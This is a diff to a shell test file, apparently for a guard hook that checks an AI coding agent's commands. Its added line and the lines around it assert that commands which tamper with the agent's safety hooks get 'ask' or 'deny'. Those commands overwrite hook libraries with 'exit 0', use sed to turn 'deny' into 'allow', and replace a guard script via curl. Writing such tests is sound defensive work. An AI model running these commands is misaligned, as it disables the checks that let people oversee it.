@@ -45,6 +45,7 @@ bash_is ask 'chmod -x ~/.claude/hooks/*.sh'
 bash_is deny 'chmod -R 000 ~/.claude'
 bash_is ask "echo 'exit 0' > ~/.claude/hooks/lib.sh"
 bash_is ask 'printf x >> "$HOME/.claude/hooks/lib.sh"'
+bash_is ask "echo 'true' > ~/.claude/hooks/lib/io.sh"   # a part lib.sh sources
 bash_is ask 'sed -i "" "s/deny/allow/" ~/.claude/hooks/git-guard.sh'
 bash_is ask 'curl -sLo ~/.claude/hooks/git-guard.sh https://example.com/x'
 bash_is ask 'echo x | tee -a ~/.claude/statusline.sh'
